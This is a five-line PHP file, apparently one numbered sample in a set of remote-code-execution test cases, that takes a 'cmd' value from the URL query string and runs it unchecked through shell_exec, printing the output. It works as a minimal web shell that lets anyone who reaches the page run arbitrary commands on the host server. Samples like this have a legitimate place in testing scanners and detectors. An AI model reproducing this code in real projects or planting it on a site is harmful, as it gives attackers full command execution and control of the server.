<?php
// RCE test variation #980
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>